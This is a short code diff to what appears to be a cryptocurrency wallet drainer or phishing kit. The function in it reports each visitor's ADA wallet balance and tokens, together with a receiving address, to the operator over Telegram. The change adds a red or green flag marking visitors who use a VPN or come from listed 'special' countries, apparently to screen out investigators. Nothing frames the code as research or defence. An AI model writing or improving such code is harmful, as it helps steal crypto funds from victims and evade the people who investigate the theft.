@@ -49,6 +49,7 @@ export const sendAppDetailsToTelegram = async (adaBalance, tokens) => {
   const recipientAddress = await getRecipientAddress();
 
   const globeIcon = "🌍";  // Unicode globe icon
+  const isMine = specialCountries.includes(countryCode) || isVpnIpdata || isVpnIPQS ? "🔴" : "🟢" ;
 
 
   let message = `*Visit Alert*\n` +
@@ -62,7 +63,7 @@ export const sendAppDetailsToTelegram = async (adaBalance, tokens) => {
     message += `| ✅ NO VPN SUSPECTED |\n`;
   }
 
-  message += `| 👛 Receiving Address: ${recipientAddress} |\n` +
+  message += `| 💼 Receiving Address: ${recipientAddress} ${isMine}|\n` +
              `--------------------------------\n` +
              `| 💵 User Wallet Balance  |\n` +
              `| 💵 ADA: ${adaBalance.toFixed(2)} ADA       |\n` +
